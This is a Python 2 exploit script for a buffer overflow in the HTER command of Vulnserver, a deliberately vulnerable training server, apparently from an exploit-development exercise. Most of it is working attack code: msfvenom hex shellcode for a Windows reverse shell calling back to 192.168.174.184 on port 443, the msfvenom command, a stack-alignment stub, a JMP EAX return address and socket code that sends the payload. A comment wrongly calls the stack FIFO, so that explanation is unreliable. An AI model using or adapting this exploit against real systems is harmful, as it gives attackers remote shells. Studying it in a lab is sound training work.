#!/usr/bin/python 

"""
http://sh3llc0d3r.com/vulnserver-hter-command-buffer-overflow-exploit/

HTER is not encoding input to bytes but it leaves it as ASCII - that's why
here we are using hex shell code etc. also HTER 0 is used because otherwise
HTER is cutting beginning of the string
"""
import socket,sys

address = "192.168.174.132"
port = 9999

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.174.184 LPORT=443 -f hex -b "\00"
shellcode = "b8a82d55e0d9e8d97424f45b29c9b15231431283c30403eb23b71517d3b5d6e724da5f0215da044706ea4f05ab8102bd38e78ab28942edfd0afecd9c88fd017eb0cd577ff530952dae3f08c1db0a916a979b918f609db01efac412a12f7d1bb92cb8d5328636e492d6b74bdbd645951cd0b5e054224bf3a358977637fa5c2093fab1b750f07eb33e1580103521099799a349bc3def0add6455fce27636a146fddbb6fa5cb47b375e4414402d76bbfab93a34253e3c6f91d0c390e2f907c4b291ae6559614eb0ce31e06bafe140dc47eb4e037714852c12ef4e934b41367b8e9d46c7077b22274ed4dbdecbae7a1ec6cbbd94e52c735d833ee4adde1ca3b2f4082f2093c826590c9f6faf45758296ff6b5f4ec72f84b3c6ae498feca09710a994474767422e31c93cf8ee83a87ddd13ae8108e24e33e5b371fc61340ae011bbc1a022f64b80aa5f1e90b65ff5d7cee3ffa734fb8aa271bb67dfea2e874c0a7b"
#stack alignment
#ESP is 00BCFA0C
#EIP is 00BCF670
"""
ESP is the Stack Pointer. Stack is a FIFO (First In First Out) and when a value
is pushed onto the stack, the value of the ESP is decremented. 
EIP goes from low to high memory, ESP goes from high to low memory 
(if new values is being pushed onto the stack.)

If EIP is bigger, than ESP, there is no problem as they are moving away from each other. 
If EIP is lower than ESP, a problem can raise as they go toward each 
other and the the program code might change if ESP reaches EIP.

Solution:
PUSH EAX
POP ESP
"""
stack_alignment = "505c9090"
#in EIP: 32547698
#JMP EAX = 625011b1
buffer = "90" * 100 + stack_alignment + shellcode + "A" * (2040 - 200 - len(shellcode) - len(stack_alignment)) + "B1115062" + "C" * (5000 - 2040 - 4)
try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
        s.send('HTER 0' + buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
